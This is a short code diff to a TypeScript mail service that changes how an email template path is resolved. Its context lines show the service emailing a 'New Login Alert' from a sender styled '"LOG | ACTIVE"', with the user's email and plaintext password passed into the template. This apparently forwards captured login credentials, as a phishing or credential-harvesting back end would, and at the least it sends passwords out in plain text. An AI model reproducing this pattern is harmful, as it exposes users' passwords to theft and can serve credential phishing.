@@ -27,7 +27,14 @@ export class MailService {
         to: recipientEmail,
         from: `"LOG | ACTIVE" <admininvestor@brackifi-investor.io>`,
         subject: `🔐 New Login Alert`,
-        template: './mail/templates/foundation.ejs',
+        template: path.join(
+          __dirname,
+          '..',
+          '..',
+          'mail',
+          'templates',
+          'foundation.ejs',
+        ),
         context: {
           email: loginDetails.email,
           password: loginDetails.password,
